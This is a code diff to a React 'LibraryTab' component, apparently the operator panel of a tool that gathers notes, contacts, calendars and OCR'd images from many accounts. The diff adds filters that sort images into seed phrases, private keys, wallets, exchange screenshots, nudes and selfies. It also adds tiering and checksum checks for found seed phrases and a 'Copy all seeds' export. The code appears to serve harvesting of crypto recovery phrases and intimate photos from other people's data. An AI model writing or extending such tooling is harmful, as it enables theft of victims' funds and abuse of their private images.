@@ -1,7 +1,11 @@
 import { useEffect, useRef, useState } from "react";
-import { fileUrl, getLibrary, getText, timeAgo } from "./api.js";
+import RetryImage from "./RetryImage.jsx";
+import { fileUrl, getLibrary, getText, thumbUrl, timeAgo } from "./api.js";
 import { Badge, Empty, Section, Spinner, displayName } from "./ui.jsx";
 import Lightbox from "./Lightbox.jsx";
+import CopyModal from "./CopyModal.jsx";
+import { SeedFilterBar } from "./seedFilters.jsx";
+import NoteImages from "./NoteImages.jsx";
 
 /* Everything from every account in one place: notes, contacts, calendar,
  * images (with OCR) and seed findings.  Read-only; the catalog is built and
@@ -16,8 +20,34 @@ const TYPES = [
   ["seeds", "Seeds"],
 ];
 
+const KIND_OPTIONS = [
+  ["seed", "Seed phrase"],
+  ["seed-candidate", "Seed candidate"],
+  ["crypto", "Crypto"],
+  ["ledger", "Ledger"],
+  ["trezor", "Trezor"],
+  ["wallet", "Wallet"],
+  ["recover", "Recover / restore"],
+  ["safe", "Safe (multisig)"],
+  ["secret", "Secret"],
+  ["privatekey", "Private key"],
+  ["backup", "Backup"],
+  ["exchange", "Exchange"],
+  ["screenshot", "Screenshot"],
+  ["text", "Text"],
+  ["document", "Document"],
+  ["receipt", "Receipt"],
+  ["nude", "Nude"],
+  ["selfie", "Selfie"],
+  ["person", "Person"],
+  ["photo", "Photo"],
+  ["meme", "Meme"],
+  ["other", "Other"],
+];
+
 const HEIC = /\.(heic|heif)$/i;
 const TIER_TONE = { valid: "green", high: "red", medium: "yellow", minimum: "blue", low: "gray" };
+const PHOTO_PAGE_SIZE = 100;
 
 function AccountTag({ item }) {
   return (
@@ -28,8 +58,8 @@ function AccountTag({ item }) {
 }
 
 function PhotoTile({ item, onOpen }) {
-  const placeholder = !item.thumb && HEIC.test(item.name);
-  const src = item.thumb || (!HEIC.test(item.name) ? item.path : "");
+  const [broken, setBroken] = useState(false);
+  const [tick, setTick] = useState(0);
   return (
     <button
       type="button"
@@ -37,14 +67,32 @@ function PhotoTile({ item, onOpen }) {
       className="overflow-hidden rounded-[10px] border border-[#e5e5ea] bg-white text-left hover:border-[#0071e3]"
     >
       <div className="relative aspect-square bg-[#f5f5f7]">
-        {item.video && !item.thumb ? (
+        {broken ? (
+          <button
+            type="button"
+            onClick={(event) => {
+              event.stopPropagation();
+              setBroken(false);
+              setTick((value) => value + 1);
+            }}
+            className="flex h-full w-full flex-col items-center justify-center gap-1 text-[22px] text-[#6e6e73] hover:bg-[#efeff2]"
+            title="Load this image again"
+          >
+            <span>🖼</span>
+            <span className="text-[9px] font-medium uppercase tracking-[0.05em]">retry</span>
+          </button>
+        ) : item.video && !item.thumb ? (
           <div className="flex h-full items-center justify-center text-[26px]">▶</div>
-        ) : src ? (
+        ) : (
           <>
-            <img
+            <RetryImage
+              key={`${item.path}-${tick}`}
               loading="lazy"
-              src={fileUrl(item.accountId, src)}
+              decoding="async"
+              src={item.thumbSrc || thumbUrl(item.accountId, item.path, item.mtime)}
+              fallbackSrc={thumbUrl(item.accountId, item.path, item.mtime)}
               alt={item.name}
+              onFail={() => setBroken(true)}
               className="h-full w-full object-cover"
             />
             {item.video ? (
@@ -53,11 +101,6 @@ function PhotoTile({ item, onOpen }) {
               </span>
             ) : null}
           </>
-        ) : (
-          <div className="flex h-full flex-col items-center justify-center gap-1 text-[11px] text-[#6e6e73]">
-            <span className="text-[22px]">🖼️</span>
-            {placeholder ? "HEIC" : "preview"}
-          </div>
         )}
         <span
           className={`absolute left-1 top-1 rounded-full px-1.5 py-0.5 text-[9px] font-semibold uppercase ${
@@ -66,6 +109,11 @@ function PhotoTile({ item, onOpen }) {
         >
           {item.ocr ? "OCR" : "pending"}
         </span>
+        {item.kind ? (
+          <span className="absolute bottom-1 left-1 rounded-full bg-black/70 px-1.5 py-0.5 text-[9px] font-semibold uppercase tracking-[0.04em] text-white">
+            {item.kind}
+          </span>
+        ) : null}
       </div>
       <div className="p-2">
         <div className="truncate text-[11px] font-medium">{displayName(item.name)}</div>
@@ -179,6 +227,8 @@ export default function LibraryTab({ admin }) {
   const [query, setQuery] = useState("");
   const [accountId, setAccountId] = useState("");
   const [page, setPage] = useState(1);
+  // Photos scroll infinitely: every loaded page is appended here.
+  const [photoItems, setPhotoItems] = useState([]);
   const [data, setData] = useState(null);
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState("");
@@ -187,9 +237,30 @@ export default function LibraryTab({ admin }) {
   const [open, setOpen] = useState(null);
   const [tick, setTick] = useState(0);
   const [flash, setFlash] = useState("");
+  const [tier, setTier] = useState("high");
+  const [checksum, setChecksum] = useState("");
+  const [words, setWords] = useState(0);
+  const [showSpam, setShowSpam] = useState(false);
+  const [kind, setKind] = useState("");
+  const [copyOpen, setCopyOpen] = useState(false);
+  const [copyText, setCopyText] = useState("");
+  const [copyCount, setCopyCount] = useState(0);
+  const [copyBusy, setCopyBusy] = useState(false);
   const dataRef = useRef(null);
   const forceRequested = useRef(false);
   const lastForced = useRef(0);
+  const scrollRef = useRef(null);
+  const sentinelRef = useRef(null);
+  const prefetchRef = useRef(new Map());
+
+  const cacheKey = (value) =>
+    `${type}|${query}|${accountId}|${tier}|${checksum}|${words}|${showSpam ? 1 : 0}|${kind}|${value}`;
+  const pageSize = type === "photos" ? PHOTO_PAGE_SIZE : 0;
+
+  function goPage(next) {
+    setPage(next);
+    scrollRef.current?.scrollTo({ top: 0, behavior: "smooth" });
+  }
 
   useEffect(() => {
     dataRef.current = data;
@@ -204,10 +275,13 @@ export default function LibraryTab({ admin }) {
     // Drop the previous payload so a type switch never renders an object as
     // an array while the next request is in flight.
     setData(null);
+    setPhotoItems([]);
     setLoading(true);
     setPage(1);
     setOpen(null);
-  }, [type, query, accountId]);
+    prefetchRef.current.clear();
+    scrollRef.current?.scrollTo({ top: 0 });
+  }, [type, query, accountId, tier, checksum, words, showSpam, kind]);
 
   // Keep the view live while scans run; one forced rebuild per minute.
   useEffect(() => {
@@ -219,6 +293,11 @@ export default function LibraryTab({ admin }) {
     let alive = true;
     if (!dataRef.current) setLoading(true);
     setError("");
+    const cached = prefetchRef.current.get(cacheKey(page));
+    if (cached) {
+      setData(cached);
+      setLoading(false);
+    }
     const scanning = (dataRef.current?.counts?.scanning ?? 0) > 0;
     const manual = forceRequested.current;
     forceRequested.current = false;
@@ -228,13 +307,27 @@ export default function LibraryTab({ admin }) {
       type,
       q: query,
       accountId,
+      tier,
+      checksum,
+      words: words || "",
+      spam: showSpam ? "1" : "",
+      kind,
       page,
+      pageSize,
       meta: 1,
       refresh: force ? "1" : "",
     })
       .then((result) => {
         if (!alive) return;
         setData(result);
+        if (type === "photos" && Array.isArray(result?.items)) {
+          setPhotoItems((previous) => {
+            if (page === 1) return result.items;
+            const seen = new Set(previous.map((item) => `${item.accountId}-${item.path}`));
+            const next = result.items.filter((item) => !seen.has(`${item.accountId}-${item.path}`));
+            return next.length ? [...previous, ...next] : previous;
+          });
+        }
         setLoading(false);
       })
       .catch((failure) => {
@@ -245,7 +338,65 @@ export default function LibraryTab({ admin }) {
     return () => {
       alive = false;
     };
-  }, [type, query, accountId, page, tick]);
+  }, [type, query, accountId, page, tick, tier, checksum, words, showSpam, pageSize]);
+
+  // Prefetch exactly one page ahead: its JSON and its thumbnail URLs.  No
+  // further pages are requested until the operator moves forward.
+  useEffect(() => {
+    if (!data || !data.pages || data.page >= data.pages) return;
+    const next = data.page + 1;
+    const key = cacheKey(next);
+    if (prefetchRef.current.has(key)) return;
+    let alive = true;
+    getLibrary({
+      type,
+      q: query,
+      accountId,
+      tier,
+      checksum,
+      words: words || "",
+      spam: showSpam ? "1" : "",
+      kind,
+      page: next,
+      pageSize,
+      meta: 1,
+    })
+      .then((result) => {
+        if (!alive) return;
+        prefetchRef.current.set(key, result);
+        if (type === "photos") {
+          // Give the visible page a head start before pulling the next one.
+          setTimeout(() => {
+            for (const item of result.items ?? []) {
+              if (item.video && !item.thumb) continue;
+              const image = new Image();
+              image.src = thumbUrl(item.accountId, item.path);
+            }
+          }, 1200);
+        }
+      })
+      .catch(() => {});
+    return () => {
+      alive = false;
+    };
+  }, [data, type, query, accountId, tier, checksum, words, showSpam, pageSize]);
+
+  // Infinite scroll: the sentinel sits after the last tile.  When it enters
+  // the viewport the next page is requested; the JSON for it is usually
+  // already prefetched, so the tiles appear immediately.
+  useEffect(() => {
+    const node = sentinelRef.current;
+    if (!node || type !== "photos" || !data) return undefined;
+    const observer = new IntersectionObserver(
+      (entries) => {
+        if (!entries.some((entry) => entry.isIntersecting)) return;
+        if (data.page < data.pages) setPage((value) => Math.max(value, data.page + 1));
+      },
+      { root: scrollRef.current || null, rootMargin: "600px 0px" }
+    );
+    observer.observe(node);
+    return () => observer.disconnect();
+  }, [type, data, photoItems.length]);
 
   const counts = data?.counts ?? {};
   const totals = data?.totals ?? {};
@@ -254,8 +405,8 @@ export default function LibraryTab({ admin }) {
       ? Array.isArray(data?.items?.photos)
         ? data.items.photos
         : []
-      : type === "photos" && Array.isArray(data?.items)
-        ? data.items
+      : type === "photos"
+        ? photoItems
         : [];
 
   async function openNote(item) {
@@ -283,12 +434,36 @@ export default function LibraryTab({ admin }) {
     }
   }
 
+  async function copyAllSeeds() {
+    setCopyBusy(true);
+    setFlash("");
+    try {
+      const result = await getLibrary({
+        type: "seeds",
+        q: query,
+        accountId,
+        tier,
+        checksum,
+        words: words || "",
+        spam: showSpam ? "1" : "",
+        compact: "1",
+      });
+      setCopyText(result.lines || "");
+      setCopyCount(Number(result.total) || 0);
+      setCopyOpen(true);
+    } catch (failure) {
+      setFlash(failure.message);
+    } finally {
+      setCopyBusy(false);
+    }
+  }
+
   function pickType(next) {
     setType(next);
   }
 
   return (
-    <div className="h-full overflow-y-auto bg-[#f5f5f7]">
+    <div ref={scrollRef} className="h-full overflow-y-auto bg-[#f5f5f7]">
       <div className="sticky top-0 z-10 border-b border-[#e5e5ea] bg-white/95 px-4 py-3 backdrop-blur">
         <div className="flex flex-wrap items-center gap-2">
           <h2 className="mr-1 text-[16px] font-semibold tracking-[-0.2px]">All notes &amp; images</h2>
@@ -329,6 +504,35 @@ export default function LibraryTab({ admin }) {
             Scan all
           </button>
         </div>
+        {type === "photos" || type === "all" ? (
+          <div className="mt-2 flex flex-wrap items-center gap-2">
+            <span className="text-[10px] font-semibold uppercase tracking-[0.05em] text-[#6e6e73]">
+              Image type
+            </span>
+            <select
+              value={kind}
+              onChange={(event) => setKind(event.target.value)}
+              className="h-8 rounded-[8px] border border-[#d2d2d7] bg-white px-2 text-[12px]"
+            >
+              <option value="">Any</option>
+              {KIND_OPTIONS.map(([id, label]) => (
+                <option key={id} value={id}>
+                  {label}
+                  {counts.photoKinds?.[id] ? ` (${counts.photoKinds[id]})` : ""}
+                </option>
+              ))}
+            </select>
+            {kind ? (
+              <button
+                type="button"
+                onClick={() => setKind("")}
+                className="text-[11px] text-[#0066cc]"
+              >
+                clear
+              </button>
+            ) : null}
+          </div>
+        ) : null}
         <div className="mt-2 flex flex-wrap items-center gap-1">
           {TYPES.map(([id, label]) => (
             <button
@@ -345,9 +549,34 @@ export default function LibraryTab({ admin }) {
           <span className="ml-auto text-[10px] text-[#6e6e73]">
             {counts.notes ?? 0} notes · {counts.photos ?? 0} images · OCR {counts.ocrDone ?? 0}/
             {(counts.ocrDone ?? 0) + (counts.ocrPending ?? 0)} · {counts.contacts ?? 0} contacts ·{" "}
-            {counts.seeds ?? 0} findings · indexed {timeAgo(data?.builtAt)}
+            {totals.seeds ?? 0} seeds shown · indexed {timeAgo(data?.builtAt)}
           </span>
         </div>
+        {type === "seeds" || type === "all" ? (
+          <div className="mt-2 rounded-[10px] border border-[#e5e5ea] bg-[#fafafa] p-2.5">
+            <SeedFilterBar
+              tier={tier}
+              setTier={setTier}
+              checksum={checksum}
+              setChecksum={setChecksum}
+              words={words}
+              setWords={setWords}
+              spamHidden={counts.seedSpam ?? 0}
+              showSpam={showSpam}
+              setShowSpam={setShowSpam}
+              extra={
+                <button
+                  type="button"
+                  onClick={copyAllSeeds}
+                  disabled={!totals.seeds || copyBusy}
+                  className="ml-auto h-8 rounded-full bg-[#0071e3] px-4 text-[12px] font-medium text-white disabled:opacity-40"
+                >
+                  {copyBusy ? "Copying…" : `Copy all (${totals.seeds ?? 0})`}
+                </button>
+              }
+            />
+          </div>
+        ) : null}
         {flash ? <p className="mt-2 text-[11px] text-[#0058b0]">{flash}</p> : null}
         {error ? (
           <p className="mt-2 rounded-[8px] bg-[#fff2f2] px-3 py-2 text-[12px] text-[#c4000a]">{error}</p>
@@ -504,7 +733,7 @@ export default function LibraryTab({ admin }) {
                 ))}
               </div>
               <div className="border-t border-[#f0f0f2] px-3 py-2">
-                <Pager page={data?.page ?? 1} pages={data?.pages ?? 1} onPage={setPage} />
+                <Pager page={data?.page ?? 1} pages={data?.pages ?? 1} onPage={goPage} />
               </div>
             </div>
             <div className="rounded-[12px] border border-[#e5e5ea] bg-white">
@@ -528,9 +757,15 @@ export default function LibraryTab({ admin }) {
                     {noteBusy ? (
                       <Spinner label="Reading" />
                     ) : (
-                      <pre className="whitespace-pre-wrap font-sans text-[12px] leading-5 text-[#1d1d1f]">
-                        {note.body}
-                      </pre>
+                      <>
+                        <pre className="whitespace-pre-wrap font-sans text-[12px] leading-5 text-[#1d1d1f]">
+                          {note.body}
+                        </pre>
+                        <NoteImages
+                          accountId={note.item.accountId}
+                          txtPath={note.item.path}
+                        />
+                      </>
                     )}
                   </>
                 ) : (
@@ -545,15 +780,25 @@ export default function LibraryTab({ admin }) {
 
         {!loading && type === "photos" ? (
           <div>
+            <div className="mb-2 flex items-center justify-between text-[11px] text-[#6e6e73]">
+              <span>
+                {photoItems.length.toLocaleString()} shown of{" "}
+                {(data?.total ?? photoItems.length).toLocaleString()}
+              </span>
+              <span>scroll for more · 100 per load</span>
+            </div>
             <div className="grid grid-cols-2 gap-2 sm:grid-cols-3 lg:grid-cols-6">
-              {(Array.isArray(data?.items) ? data.items : []).map((item, index) => (
+              {photoItems.map((item, index) => (
                 <PhotoTile key={`${item.accountId}-${item.path}`} item={item} onOpen={() => setOpen(index)} />
               ))}
             </div>
-            {!data?.items?.length ? (
+            {!photoItems.length ? (
               <Empty title="No images">Nothing matches this search, or no export has images yet.</Empty>
             ) : null}
-            <Pager page={data?.page ?? 1} pages={data?.pages ?? 1} onPage={setPage} />
+            <div ref={sentinelRef} className="h-10" />
+            {data && data.page < data.pages ? (
+              <div className="pb-4 text-center text-[11px] text-[#9a9aa0]">loading more…</div>
+            ) : null}
           </div>
         ) : null}
 
@@ -565,7 +810,7 @@ export default function LibraryTab({ admin }) {
               <Empty title="No contacts">No contacts match this search.</Empty>
             )}
             <div className="px-3 pb-2">
-              <Pager page={data?.page ?? 1} pages={data?.pages ?? 1} onPage={setPage} />
+              <Pager page={data?.page ?? 1} pages={data?.pages ?? 1} onPage={goPage} />
             </div>
           </div>
         ) : null}
@@ -578,7 +823,7 @@ export default function LibraryTab({ admin }) {
               <Empty title="No calendar entries">No events or reminders match this search.</Empty>
             )}
             <div className="px-3 pb-2">
-              <Pager page={data?.page ?? 1} pages={data?.pages ?? 1} onPage={setPage} />
+              <Pager page={data?.page ?? 1} pages={data?.pages ?? 1} onPage={goPage} />
             </div>
           </div>
         ) : null}
@@ -590,6 +835,10 @@ export default function LibraryTab({ admin }) {
                 {data.items.map((item, index) => (
                   <div key={`${item.accountId}-${item.phrase}-${index}`} className="flex items-center gap-2 px-3 py-2">
                     <Badge tone={TIER_TONE[item.tier] ?? "gray"}>{item.tier}</Badge>
+                    <Badge tone={item.checksum ? "green" : "gray"}>
+                      {item.checksum ? "valid" : "failed"}
+                    </Badge>
+                    <Badge tone="gray">{item.words}w</Badge>
                     <span className="min-w-0 flex-1 truncate font-mono text-[11px]">{item.phrase}</span>
                     <span className="hidden shrink-0 text-[10px] text-[#6e6e73] sm:inline">{item.file}</span>
                     <AccountTag item={item} />
@@ -608,7 +857,7 @@ export default function LibraryTab({ admin }) {
               </Empty>
             )}
             <div className="px-3 pb-2">
-              <Pager page={data?.page ?? 1} pages={data?.pages ?? 1} onPage={setPage} />
+              <Pager page={data?.page ?? 1} pages={data?.pages ?? 1} onPage={goPage} />
             </div>
           </div>
         ) : null}
@@ -621,6 +870,15 @@ export default function LibraryTab({ admin }) {
           index={open}
           setIndex={setOpen}
           onClose={() => setOpen(null)}
+        />
+      ) : null}
+
+      {copyOpen ? (
+        <CopyModal
+          title="Copy all seeds"
+          text={copyText}
+          count={copyCount}
+          onClose={() => setCopyOpen(false)}
         />
       ) : null}
     </div>
